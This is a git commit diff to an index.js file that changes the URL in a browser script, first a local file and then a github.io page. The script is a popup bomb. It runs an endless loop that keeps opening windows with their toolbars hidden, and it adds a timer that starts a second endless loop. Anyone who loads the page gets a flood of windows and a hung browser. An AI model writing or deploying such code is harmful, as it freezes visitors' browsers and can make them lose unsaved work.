6393c045431ecdf9f0ad3d2162bb93f7f524ce04
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 13:27:25 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 while(true)
 {
-window.open('file:///Users/Andrew/Desktop/index.html', '_blank', 'toolbar=0,location=0,menubar=0');
+window.open('http://Dr3w0623.github.io/repository.', '_blank', 'toolbar=0,location=0,menubar=0');
 setTimeout(function(){
 for(var i = 0; i === i; i++) {}
 }, 50); 
